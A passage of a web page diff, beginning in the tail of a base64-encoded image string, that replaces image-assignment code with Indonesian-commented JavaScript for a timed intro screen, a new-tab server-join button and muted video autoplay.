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";
+/* ==================================================
+   INTRO
+================================================== */
 
-document.getElementById("heroImage").src=photo;
+function enterSite(){
 
-document
-.querySelectorAll(".card-img")
-.forEach(img=>{
-img.src=photo;
-});
+  const intro =
+    document.getElementById("intro");
+
+  intro.classList.add("hide");
+
+}
+
+
+/* otomatis masuk setelah 2.2 detik */
+
+setTimeout(function(){
+
+  enterSite();
+
+},2200);
+
+
+/* ==================================================
+   SERVER BUTTON
+================================================== */
+
+function joinServer(url){
+
+  window.open(
+    url,
+    "_blank",
+    "noopener,noreferrer"
+  );
+
+}
+
+
+/* ==================================================
+   FORCE VIDEO PLAY
+================================================== */
+
+document.addEventListener(
+  "DOMContentLoaded",
+  function(){
+
+    const videos =
+      document.querySelectorAll("video");
+
+    videos.forEach(function(video){
+
+      video.muted = true;
+
+      const playPromise =
+        video.play();
+
+      if(playPromise !== undefined){
+
+        playPromise.catch(function(){
+
+          console.log(
+            "Video menunggu interaksi user."
+          );
+
+        });
+
+      }
+
+    });
+
+  }
+);
 
 </script>
 
 </body>
-  </html>
+</html>
